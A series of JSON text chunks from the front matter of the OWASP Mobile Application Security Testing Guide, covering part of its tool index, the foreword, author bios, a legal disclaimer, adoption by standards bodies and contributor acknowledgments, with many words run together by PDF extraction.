    "text": ". . . . . . . . . . . . . . . . . . . . . . . . . . 535 Proguard . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 536 MobSFforAndroid . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 536 BytecodeViewer . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 536 radare2forAndroid . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 537 AndroidNDK . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 541 jadx . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 542 nm-Android . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 542 Android-SSL-TrustKiller . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 542 House . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 542 AndroidSDK . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 543 simctl . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 24
    }
  },
  {
    "text": ". . . . . . . . . . . . 543 simctl . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 544 lldb . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 544 9\\nXcodeCommandLineTools . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 544 class-dump-dyld . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 544 FridaforiOS . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 544 security . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 546 SwiftShield . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 546 MachoOView . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 548 Usbmuxd . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 548 Xcode . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 548 Frida-ios-dump . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 25
    }
  },
  {
    "text": ". . . . . . . . 548 Frida-ios-dump . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 548 gdb . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 549 radare2foriOS . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 549 Frida-cycript . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 549 iProxy . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 549 nm-iOS . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 549 SSLKillSwitch2 . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 549 ios-deploy . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 550 iOSbackup . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 550 MobSFforiOS . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 550 class-dump . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 551 Sileo",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 26
    }
  },
  {
    "text": ". . . . 550 class-dump . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 551 Sileo . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 551 Cydia . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 552 class-dump-z . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 553 Plutil . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 553 otool . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 553 BinaryCookieReader . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 553 objectionforiOS . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 553 swift-demangle . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 554 Keychain-Dumper . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 555 Grapefruit . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 555 Cycript . . . . .",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 27
    }
  },
  {
    "text": ". . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 555 Cycript . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 555 xcrun . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 558 optool . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 558 dsdump . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 558 bettercap . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 559 BurpSuite . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 559 Wireshark . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 560 OWASPZAP . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 560 tcpdump . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 560 MITMRelay . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 560 Androidtcpdump .",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 28
    }
  },
  {
    "text": ". . . 560 MITMRelay . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 560 Androidtcpdump . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 560 r2frida . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 560 Frida . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 562 FridaCodeShare . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 564 LIEF . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 564 Ghidra . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 565 RMSRuntimeMobileSecurity . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 569 iaito . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 569 MobSF . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 570 objection . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 570 Referenceapplications 571 OVAA . . .",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 29
    }
  },
  {
    "text": ". . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 570 Referenceapplications 571 OVAA . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 571 InsecureShop . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 571 AndroGoat . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 571 AndroidLicenseValidator . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 571 InsecureBankv2 . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 572 DodoVulnerableBank . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 572 AndroidUnCrackableL3 . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 572 AndroidUnCrackableL1 . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 572 10\\nMASTGHackingPlayground(Kotlin) . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 572 MASTGHackingPlayground(Java) . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 573 Digitalbank . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 573 DIVAAndroid . . . .",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 30
    }
  },
  {
    "text": "573 Digitalbank . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 573 DIVAAndroid . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 573 DVHMA . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 573 AndroidUnCrackableL4 . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 573 AndroidUnCrackableL2 . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 574 DVIA . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 574 DVIA-v2 . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 574 SuggestedReading 575 MobileAppSecurity . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 575 ReverseEngineering . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 575 11\\nForeword WelcometotheOWASPMobileApplicationSecurityTestingGuide. Feelfreetoexploretheexistingcontent,butdonote thatit may changeat any time. New APIsand best practicesareintroducediniOS and Androidwithevery major (and minor)releaseandalsovulnerabilitiesarefoundeveryday. Ifyouhavefeedbackorsuggestions,orwanttocontribute,createanissueonGitHuborpingusonSlack. SeetheREADME forinstructions: https://www.github.com/OWASP/owasp-mastg/ squirrel(nounplural): AnyarborealsciurinerodentofthegenusSciurus,suchasS.vulgaris(redsquirrel) orS.carolinensis(greysquirrel),havingabushytailandfeedingonnuts,seeds,etc. On a beautiful summer day, a group of ~7 young men, a woman, and approximately three squirrels met in a Woburn ForestvilladuringtheOWASPSecuritySummit2017. Sofar,nothingunusual. Butlittledidyouknow,withinthenextfive days,theywouldredefinenotonlymobileapplicationsecurity,buttheveryfundamentalsofbookwritingitself(ironically, theeventtookplacenearBletchleyPark,oncetheresidenceandworkplaceofthegreatAlanTuring). Ormaybethat’sgoingtoofar. Butatleast,theyproducedaproof-of-conceptforanunusualsecuritybook. TheMobile ApplicationSecurityTestingGuide(MASTG)isanopen,agile,crowd-sourcedeffort,madeofthecontributionsofdozens ofauthorsandreviewersfromallovertheworld. Becausethisisn’tanormalsecuritybook,theintroductiondoesn’tlistimpressivefactsanddataprovingimportanceof mobile devices in this day and age. It also doesn’t explain how mobile application security is broken, and why a book likethiswassorelyneeded,andtheauthorsdon’tthanktheirbelovedoneswithoutwhomthebookwouldn’thavebeen possible. We do have a message to our readers however! The first rule of the OWASP Mobile Application Security Testing Guide is: Don’tjustfollowtheOWASPMobileApplicationSecurityTestingGuide. Trueexcellenceatmobileapplicationsecurity requiresadeepunderstandingofmobileoperatingsystems,coding,networksecurity,cryptography,andawholelotof otherthings,manyofwhichwecanonlytouchonbrieflyinthisbook. Don’tstopatsecuritytesting. Writeyourownapps, compileyourownkernels,dissectmobilemalware,learnhowthingstick. Andasyoukeeplearningnewthings,consider contributingtotheMASTGyourself! Or,astheysay:",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 31
    }
  },
  {
    "text": "day and age. It also doesn’t explain how mobile application security is broken, and why a book likethiswassorelyneeded,andtheauthorsdon’tthanktheirbelovedoneswithoutwhomthebookwouldn’thavebeen possible. We do have a message to our readers however! The first rule of the OWASP Mobile Application Security Testing Guide is: Don’tjustfollowtheOWASPMobileApplicationSecurityTestingGuide. Trueexcellenceatmobileapplicationsecurity requiresadeepunderstandingofmobileoperatingsystems,coding,networksecurity,cryptography,andawholelotof otherthings,manyofwhichwecanonlytouchonbrieflyinthisbook. Don’tstopatsecuritytesting. Writeyourownapps, compileyourownkernels,dissectmobilemalware,learnhowthingstick. Andasyoukeeplearningnewthings,consider contributingtotheMASTGyourself! Or,astheysay: “Doapullrequest”. 12\\n13\\nFrontispiece About the OWASP MASTG TheOWASPMobileApplicationSecurityTestingGuide(MASTG),whichispartoftheOWASPMobileApplicationSecurity (MAS) flagship project, is a comprehensive manual covering the processes, techniques, and tools used during mobile applicationsecurityanalysis,aswellasanexhaustivesetoftestcasesforverifyingtherequirementslistedintheOWASP Mobile Application Security Verification Standard (MASVS), providing a baseline for complete and consistent security tests. The OWASP MASVS and MASTG are trusted by the following platform providers and standardization, governmental and educationalinstitutions. Learnmore. Authors Bernhard Mueller Bernhardisacybersecurityspecialistwithatalentforhackingsystemsofallkinds. Duringmorethanadecadeinthe industry,hehaspublishedmanyzero-dayexploitsforsoftwaresuchasMSSQLServer,AdobeFlashPlayer,IBMDirector, CiscoVOIP,andModSecurity. Ifyoucannameit,hehasprobablybrokenitatleastonce. BlackHatUSAcommendedhis pioneeringworkinmobilesecuritywithaPwnieAwardforBestResearch. Sven Schleier Sven is an experienced web and mobile penetration tester and assessed everything from historic Flash applications to progressive mobile apps. He is also a security engineer that supported many projects end-to-end during the SDLC to “build security in”. He was speaking at local and international meetups and conferences and is conducting hands-on workshopsaboutwebapplicationandmobileappsecurity. 14\\nJeroen Willemsen Jeroenisaprincipalsecurityarchitectwithapassionformobilesecurityandriskmanagement. Hehassupportedcompa- niesasasecuritycoach,asecurityengineerandasafull-stackdeveloper,whichmakeshimajackofalltrades. Heloves explainingtechnicalsubjects: fromsecurityissuestoprogrammingchallenges. Carlos Holguera Carlosisamobilesecurityresearchengineerwhohasgainedmanyyearsofhands-onexperienceinthefieldofsecurity testing for mobile apps and embedded systems such as automotive control units and IoT devices. He is passionate about reverse engineering and dynamic instrumentation of mobile apps and is continuously learning and sharing his knowledge. Co-Authors Co-authorshaveconsistentlycontributedqualitycontentandhaveatleast2,000additionsloggedintheGitHubreposi- tory. Romuald Szkudlarek Romualdisapassionatecybersecurity&privacyprofessionalwithover15yearsofexperienceintheweb,mobile,IoT and cloud domains. During his career, he has been dedicating his spare time to a variety of projects with the goal of advancing the sectors of software and security. He is teaching regularly at various institutions. He holds CISSP, CCSP, CSSLP,andCEHcredentials. Jeroen Beckers JeroenisamobilesecurityleadresponsibleforqualityassuranceonmobilesecurityprojectsandforR&Donallthings mobile. Althoughhestartedhiscareerasaprogrammer,hefoundthatitwasmorefuntotakethingsapartthantoput thingstogether,andtheswitchtosecuritywasquicklymade. Eversincehismaster’sthesisonAndroidsecurity,Jeroen has been interested in mobile devices and their (in)security. He loves sharing his knowledge with other people, as is demonstratedbyhismanytalks&trainingsatcolleges,universities,clientsandconferences. Vikas Gupta Vikasisanexperiencedcybersecurityresearcher,withexpertiseinmobilesecurity. Inhiscareerhehasworkedtosecure applicationsforvariousindustriesincludingfintech,banksandgovernments. Heenjoysreverseengineering,especially obfuscatednativecodeandcryptography. Heholdsmastersinsecurityandmobilecomputing,andanOSCPcertification. Heisalwaysopentosharehisknowledgeandexchangeideas. 15\\nChangelog AllourChangelogsareavailableonlineattheOWASPMASTGGitHubrepository,seetheReleasespage: https://github.com/OWASP/owasp-mastg/releases Disclaimer PleaseconsultthelawsinyourcountrybeforeexecutinganytestsagainstmobileappsbyutilizingtheMASTGmaterials. RefrainfromviolatingthelawswithanythingdescribedintheMASTG. Our[CodeofConduct]hasfurtherdetails: https://github.com/OWASP/owasp-mastg/blob/master/CODE_OF_CONDUCT. md OWASP thanks the many authors, reviewers, and editors for their hard work in developing this guide. If you have any commentsorsuggestions,pleaseconnectwithus: https://mas.owasp.org/contact IfyoufindanyinconsistenciesortypospleaseopenanissueintheOWASPMASTGGithubRepo: https://github.com/OWA SP/owasp-mastg Copyright and License Copyright©TheOWASPFoundation. ThisworkislicensedunderaCreativeCommonsAttribution-ShareAlike4.0Interna- tionalLicense. Foranyreuseordistribution,youmustmakecleartoothersthelicensetermsofthiswork. 16\\nOWASP MASVS and MASTG Adoption The OWASP MASVS and MASTG are trusted by the following platform providers and standardization, governmental and educationalinstitutions. Mobile Platform Providers Google Android Since 2021 Google has shown their support for the OWASP Mobile Security project (MASTG/MASVS) and has started providingcontinuousandhighvaluefeedbacktotheMASVSrefactoringprocessviatheAppDefenseAlliance(ADA)and itsMASA(MobileApplicationSecurityAssessment)program. With MASA, Google has acknowledged the importance of leveraging a globally recognized standard for mobile app se- curityto the mobile appecosystem. Developers canwork directlywith an AuthorizedLab partner to initiate asecurity assessment. Googlewillrecognizedeveloperswhohavehadtheirapplicationsindependentlyvalidatedagainstasetof MASVSLevel1requirementsandwillshowcasethisontheirDatasafetysection. WethankGoogle,theADAandallitsmembersfortheirsupportandfortheirexcellentworkonprotectingthemobileapp ecosystem. Certification Institutions CREST CREST is an international not-for-profit, membership body who quality assures its members and delivers professional certifications to the cyber security industry. CREST works with governments, regulators, academe, training partners, professionalbodiesandotherstakeholdersaroundtheworld. InAugust2022,CRESTlaunchedtheOWASPVerificationStandard(OVS)Programme. CRESTOVSsetsnewstandardsfor applicationsecurity. UnderpinnedbyOWASP’sApplicationSecurityVerificationStandard(ASVS)andMobileApplication Security Verification Standard (MASVS), CREST is leveraging the open-source community to build and maintain global standardstodeliveraglobalwebandmobileapplicationsecurityframework. Thiswillprovideassurancetothebuying communitythatdevelopersusingCRESTOVSaccreditedproviders,alwaysknowthattheyareengagedwithethicaland capableorganisationswithskilledandcompetentsecuritytestersbyleveragingtheOWASPASVSandMASVSstandards. • CRESTOVSProgramme • CRESTOVSAccreditationProcess • CRESTOVSIntroductoryVideo 17\\nWe thank CREST for their consulation regarding the OVS programme and its support to the",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 32
    }
  },
  {
    "text": "governments, regulators, academe, training partners, professionalbodiesandotherstakeholdersaroundtheworld. InAugust2022,CRESTlaunchedtheOWASPVerificationStandard(OVS)Programme. CRESTOVSsetsnewstandardsfor applicationsecurity. UnderpinnedbyOWASP’sApplicationSecurityVerificationStandard(ASVS)andMobileApplication Security Verification Standard (MASVS), CREST is leveraging the open-source community to build and maintain global standardstodeliveraglobalwebandmobileapplicationsecurityframework. Thiswillprovideassurancetothebuying communitythatdevelopersusingCRESTOVSaccreditedproviders,alwaysknowthattheyareengagedwithethicaland capableorganisationswithskilledandcompetentsecuritytestersbyleveragingtheOWASPASVSandMASVSstandards. • CRESTOVSProgramme • CRESTOVSAccreditationProcess • CRESTOVSIntroductoryVideo 17\\nWe thank CREST for their consulation regarding the OVS programme and its support to the open-source community to buildandmaintainglobalcybersecuritystandards. Standardization Institutions NIST (National Institute of Standards and Technology, United States) TheNationalInstituteofStandardsandTechnology(NIST)wasfoundedin1901andisnowpartoftheU.S.Departmentof Commerce. NISTisoneofthenation’soldestphysicalsciencelaboratories. Congressestablishedtheagencytoremove amajorchallengetoU.S.industrialcompetitivenessatthetime—asecond-ratemeasurementinfrastructurethatlagged behindthecapabilitiesoftheUnitedKingdom,Germanyandothereconomicrivals. • NIST.SP.800-163“VettingtheSecurityofMobileApplications”Revision1,2019 • NIST.SP.800-218“SecureSoftwareDevelopmentFramework(SSDF)v1.1: RecommendationsforMitigatingtheRisk ofSoftwareVulnerabilities”v1.1,2022 BSI (Bundesamt für Sicherheit in der Informationstechnik, Germany) BSIstandsfor“FederalOfficeforInformationSecurity”,ithasthegoaltopromoteITsecurityinGermanyandisthecentral ITsecurityserviceproviderforthefederalgovernment. • TechnicalGuidelineBSITR-03161SecurityrequirementsforeHealthapplicationsv1.0,2020 • PrüfvorschriftfürdenProduktgutachterdes„ePA-FrontenddesVersicherten“unddes„E-Rezept-FrontenddesVer- sichertenv2.0,2021 ioXt 18\\nThe mission of the ioXt Alliance is to build confidence in Internet of Things products through multi-stakeholder, inter- national, harmonized, and standardized security and privacy requirements, product compliance programs, and public transparencyofthoserequirementsandprograms. In2021,ioXthasextendeditssecurityprinciplesthroughtheMobileApplicationprofile,sothatappdeveloperscanensure theirproductsarebuiltwith, andmaintain, highcybersecuritystandardssuchastheOWASPMASVSandtheVPNTrust Initiative. TheioXtMobileApplicationprofileisasecuritystandardthatappliestoanycloudconnectedmobileappand providesthemuchneededmarkettransparencyforconsumerandcommercialmobileappsecurity. • ioXtBaseProfilev2.0 Governmental Institutions Name Document Year EuropeanPaymentsCouncil PaymentThreatsandFraudTrendsReport 2021 EuropeanPaymentsCouncil MobileInitiatedSEPACreditTransferInteroperability 2019 ImplementationGuidelines,includingSCTInstant(MSCTIIGs) ENISA(EuropeanUnionAgencyfor GoodPracticesforSecurityofSMARTCARS 2019 Cybersecurity) GovernmentofIndia,MinistryofElectronics AdoptionofMobileAppSecVerificationStandard(MASVS) 2019 &InformationTechnology Version1.0ofOWASP FinishTransportandCommunicationAgency Assessmentguidelineforelectronicidentificationservices 2019 (TRAFICOM) (Draft) GobiernodeEspañaINCIBE CiberseguridadenSmartToys 2019 Educational Institutions Name Document Year LeibnizFachhochschuleHannover,Germany SicherheitsüberprüfungvonmobileniOSAppsnachOWASP 2022 (German) UniversityofFlorida,FloridaInstitutefor “SO{U}RCERER:Developer-DrivenSecurityTestingFramework 2021 CybersecurityResearch,UnitedStates forAndroidApps” UniversityofAdelaide,AustraliaandQueen AnEmpiricalAssessmentofGlobalCOVID-19ContactTracing 2021 MaryUniversityofLondon,UnitedKingdom Applications SchoolofInformationTechnology,Mapúa AVulnerabilityAssessmentontheParentalControlMobile 2021 University,Philippines ApplicationsSecurity: StatusbasedontheOWASPSecurity Requirements Application in Scientific Research • STAMBA:SecurityTestingforAndroidMobileBankingApps Books • Hands-OnSecurityinDevOps 19\\nIndustry Case Studies • CaseStudy: NowSecureCommitstoSecurityStandards Wouldyouliketocontributewithyourcasestudy? Connectwithus! 20\\nAcknowledgments Contributors AllofourcontributorsarelistedintheContributingsectionoftheOWASPMASwebsite: https://mas.owasp.org/contributing/ (cid:0) MAS Advocates MASAdvocatesareindustryadoptersoftheOWASPMASVSandMASTGwhohaveinvestedasignificantandconsistent amount of resources to push the project forward by providing consistent high-impact contributions and continuously spreadingtheword. (cid:0) Being an “MAS Advocate” is the highest status that companies can achieve in the project acknowledging that they’vegoneaboveandbeyondtosupporttheproject. Wewillvalidatethisstatusaccordingtothesecategories: 1. ShowingAdoption: itshouldbeclearjustfromlookingattheofficialcompanypagethattheyhaveadoptedthe OWASPMASVSandMASTG.Forexample: • Services/Products • Resources(e.g.blogposts,pressreleases,publicpentestreports) • Trainings • etc. 2. Providing consistent high-impact contributions: by continuously supporting with time/dedicated resources withclear/highimpactfortheOWASPMASproject. • ContentPullRequests(e.g.adding/upgradingexistingtests,tooling,maintainingcodesamples,etc.) • TechnicalPRreviews • Improvingautomation(GitHubActions) • Upgrading,extendingorcreatingnewCrackmes • ModeratingGitHubDiscussions • Providinghigh-valuefeedbacktotheprojectandforspecialeventssuchastheMASVS/MASTGrefactoring. • etc. 3. Spreadingthewordandpromotingtheprojectwithmanypresentationseachyear,publictrainings,highsocial mediainvolvement(e.g.liking,re-sharing,doingownpostingspecificallytopromotetheproject). NOTE: You have to satisfy all three categories in order to qualify as an MAS Advocate. However, you do not need to fulfilleachandeverybulletpoint(theyareexamples). Ingeneral,youmustbeabletoclearlyshowthecontinuityofyour contributionsandhighimpactfortheproject. Forexample,tofulfill“2.” youcoulddemonstratethatyou’vebeensending high-impactPullRequestintheinitial6monthsperiodandintendtocontinuetodoso. (cid:0) Benefits • CompanylogodisplayedinourmainREADMEsandmainOWASPprojectsite. • LinkedblogpostsintheMASTGwillincludethecompanyname. • SpecialacknowledgementoneachMASTGreleasecontainingthecontributedPRs. • Re-sharesfromtheOWASPMASaccountsonnewpublications(e.g.retweets). • Initialpublic“ThankYou”andyearlyaftersuccessfulrenewal. 21\\n(cid:0) How to Apply Ifyou’dliketoapplypleasecontacttheprojectleadersbysendinganemailtoSvenSchleierandCarlosHolguerawho willvalidateyourapplication. Pleasebesuretoincludesufficientevidence(usuallyintheformofacontributionreport includingURLslinkingtothecorrespondingelements)showingwhatyou’vedoneinthe6monthsperiodthatgoesinline withthethreecategoriesdescribedabove. (cid:0) Important Disclaimers • Ifthe“MASAdvocate”statusisgrantedandyou’dliketomaintainit,theaforementionedcontributionsmustremain consistentaftertheinitialperiodaswell. Youshouldkeepcollectingthisevidenceandsendusacontributionreport yearly. • Financialdonationsarenotpartoftheeligibilitycriteriabutwillbelistedforcompletion. • Re-sharedpublicationsandblogpostslinkedinMASTGtextmustbeeducationalandfocusonmobilesecurityor MASVS/MASTGandnotendorsecompanyproducts/services. • Advocate Companies may use the logo and links to MASVS/MASTG resources as part of their communication but cannotusethemasanendorsementbyOWASPasapreferredproviderofsoftwareandservices. – Exampleofwhat’sok: listMASAdvocatestatusonwebsitehomepage, in“aboutcompany”slidesinsales presentations,onsalescollateral. – Exampleofwhat’snotok: aMASAdvocatecannotclaimtheyareOWASPcertified. • ThequalityoftheapplicationoftheMASVS/MASTGbythesecompanieshasnotbeenvettedbytheMASteam. TheOWASPFoundationisverygratefulforthesupportbytheindividualsandorganizationslisted. Howeverplease note,theOWASPFoundationisstrictlyvendorneutralanddoesnotendorseanyofitssupporters. MASAdvocates donotinfluencethecontentoftheMASVSorMASTGinanyway. Our MAS Advocates NowSecure has provided consistent high-impact contributions to the project and has successfully helped spread the word. We’d like to thank NowSecure for its exemplary contribution which sets a blueprint for other potential contributorswantingtopushtheprojectforward. NowSecure as a MASVS/MASTG Adopter • Services/Products: – NowSecureDebutsNewOWASPMASVSMobilePenTests – NowSecurePlatformforAutomatedMobileSecurityTesting • Resources: – TheEssentialGuidetotheOWASPMobileSecurityProject • Trainings: – StandardsandRiskAssessment – OWASPMASVS&MASTGUpdates – IntrotoMobileAppSecurity 22\\nNowSecure’s Contributions to the MAS Project High-impactContributions(time/dedicatedresources): • ContentPRs • TechnicalReviewsforPRs • ParticipationinGitHubDiscussions AspecialmentiongoesforthecontributiontotheMASVSRefactoring: • Significanttimeinvestmenttodrivethediscussionsandcreatetheproposalsalongwiththecommunity • TestabilityAnalysis • Feedbackoneachcategoryproposal • Statisticsfrominternalanalysis Inthepast, NowSecurehasalsocontributedtotheproject, hassponsoreditbecominga“GodModeSponsor”andhas donatedtheUnCrackableAppforAndroidLevel4: Radare2Pay. SpreadingtheWord: • Socialmediainvolvement: continuousTwitterandLinkedInactivity(seeexamples) • CaseStudy: NowSecureCommitstoSecurityStandards • BlogPosts: – Integratesecurityintothemobileappsoftwaredevelopmentlifecycle – OWASPMobileSecurityTestingChecklistAidsCompliance • Presentations: – “MobileWanderlust”! OurjourneytoVersion2.0! (OWASPAppSecEU,Jun102022) – InsidersGuidetoMobileAppSecwithLatestOWASPMASVS(OWASPTorontoChapter,Feb102022) – InsidersGuidetoMobileAppSecwithLatestOWASPMASVS(OWASPVirtualAppSec2021,Nov112021) – InsidersGuidetoMobileAppSecwithOWASPMASVS(OWASPNorthernVirginiaChapter,Oct82021) – andmore",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 33
    }
  },
  {
    "text": "MAS Project High-impactContributions(time/dedicatedresources): • ContentPRs • TechnicalReviewsforPRs • ParticipationinGitHubDiscussions AspecialmentiongoesforthecontributiontotheMASVSRefactoring: • Significanttimeinvestmenttodrivethediscussionsandcreatetheproposalsalongwiththecommunity • TestabilityAnalysis • Feedbackoneachcategoryproposal • Statisticsfrominternalanalysis Inthepast, NowSecurehasalsocontributedtotheproject, hassponsoreditbecominga“GodModeSponsor”andhas donatedtheUnCrackableAppforAndroidLevel4: Radare2Pay. SpreadingtheWord: • Socialmediainvolvement: continuousTwitterandLinkedInactivity(seeexamples) • CaseStudy: NowSecureCommitstoSecurityStandards • BlogPosts: – Integratesecurityintothemobileappsoftwaredevelopmentlifecycle – OWASPMobileSecurityTestingChecklistAidsCompliance • Presentations: – “MobileWanderlust”! OurjourneytoVersion2.0! (OWASPAppSecEU,Jun102022) – InsidersGuidetoMobileAppSecwithLatestOWASPMASVS(OWASPTorontoChapter,Feb102022) – InsidersGuidetoMobileAppSecwithLatestOWASPMASVS(OWASPVirtualAppSec2021,Nov112021) – InsidersGuidetoMobileAppSecwithOWASPMASVS(OWASPNorthernVirginiaChapter,Oct82021) – andmore Donators WhileboththeMASVSandtheMASTGarecreatedandmaintainedbythecommunityonavoluntarybasis,sometimesa littlebitofoutsidehelpisrequired. Wethereforethankourdonatorsforprovidingthefundstobeabletohiretechnical editors. Note that their donation does not influence the content of the MASVS or MASTG in any way. The Donation PackagesaredescribedonourOWASPProjectpage. 23\\n24\\nIntroduction to the OWASP Mobile Application Security Project Newtechnologyalwaysintroducesnewsecurityrisks,andmobilecomputingisnoexception. Securityconcernsformobile apps differ from traditional desktop software in some important ways. Modern mobile operating systems are arguably moresecurethantraditionaldesktopoperatingsystems,butproblemscanstillappearwhenwedon’tcarefullyconsider security during mobile app development. Data storage, inter-app communication, proper usage of cryptographic APIs, andsecurenetworkcommunicationareonlysomeoftheseconsiderations. The OWASP Mobile Application Security Verification Standard (MASVS) defines a mobile app security model and lists genericsecurityrequirementsformobileapps. Itcanbeusedbyarchitects,developers,testers,securityprofessionals, andconsumerstodefineandunderstandthequalitiesofasecuremobileapp. 